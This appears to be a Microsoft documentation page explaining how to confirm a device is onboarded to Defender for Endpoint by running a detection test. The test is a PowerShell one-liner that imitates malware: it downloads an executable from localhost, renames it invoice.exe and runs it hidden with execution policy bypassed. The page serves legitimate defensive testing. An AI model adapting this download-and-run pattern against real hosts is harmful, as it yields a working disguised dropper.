---
title: Run a detection test on a device to verify it has been properly onboarded to Microsoft Defender for Endpoint
description: Run the detection test script on a device recently onboarded to the Microsoft Defender for Endpoint service to verify that it's properly added.
search.appverid: met150
ms.service: microsoft-365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
ms.author: macapara
author: mjcaparas
ms.localizationpriority: medium
ms.date: 04/24/2023
manager: dansimp
audience: ITPro
ms.collection: 
- m365-security
- tier1
ms.topic: conceptual
ms.subservice: mde
---

# Run a detection test on a newly onboarded Microsoft Defender for Endpoint device

[!INCLUDE [Microsoft 365 Defender rebranding](../../includes/microsoft-defender.md)]


**Applies to:**
- Windows 11
- Supported Windows 10 versions
- Windows Server 2012 R2
- Windows Server 2016
- Windows Server, version 1803
- Windows Server 2019
- Windows Server 2022
- [Microsoft Defender for Endpoint Plan 1](https://go.microsoft.com/fwlink/p/?linkid=2154037)
- [Microsoft Defender for Endpoint Plan 2](https://go.microsoft.com/fwlink/?linkid=2154037)
- [Microsoft 365 Defender](https://go.microsoft.com/fwlink/?linkid=2118804)

> Want to experience Microsoft Defender for Endpoint? [Sign up for a free trial.](https://signup.microsoft.com/create-account/signup?products=7f379fee-c4f9-4278-b0a1-e4c8c2fcdf7e&ru=https://aka.ms/MDEp2OpenTrial?ocid=docs-wdatp-exposedapis-abovefoldlink)

When you add a device to the Microsoft Defender for Endpoint service for management, this is also called onboarding devices. Onboarding allows devices to report signals about their health status to the service.

Making sure, or verifying, that a device has been added to the service successfully is a critical step in the entire deployment process. It assures that all the devices expected are being managed. 

## Verify Microsoft Defender for Endpoint onboarding of a device using a PowerShell detection test

Run the following PowerShell script on a newly onboarded device to verify that it's properly reporting to the Defender for Endpoint service.

1. Open an elevated command-line prompt on the device and run the script:

   1. Go to **Start** and type **cmd**.

   1. Right-click **Command Prompt** and select **Run as administrator**.

      :::image type="content" source="images/run-as-admin.png" alt-text="The Start menu pointing to Run as administrator" lightbox="images/run-as-admin.png":::
    
2. At the prompt, copy and run the following command:

   ```powershell
   powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference = 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-MDATP-test\\invoice.exe');Start-Process 'C:\\test-MDATP-test\\invoice.exe'
   ```

The Command Prompt window closes automatically. If successful, a new alert appears in the portal for the onboarded device in about 10 minutes.

> [!NOTE]
> You can also use the EICAR test string to perform this test. Create a text file, paste the EICAR line, and save the file as an executable file to your endpoint's local drive. You will receive a test endpoint notification and an alert in the Microsoft 365 Defender portal.

## Related topics

- [Onboard Windows devices](configure-endpoints.md)
- [Onboard servers](configure-server-endpoints.md)
- [Troubleshoot Microsoft Defender for Endpoint onboarding issues](/microsoft-365/security/defender-endpoint/troubleshoot-onboarding)
[!INCLUDE [Microsoft Defender for Endpoint Tech Community](../../includes/defender-mde-techcommunity.md)]
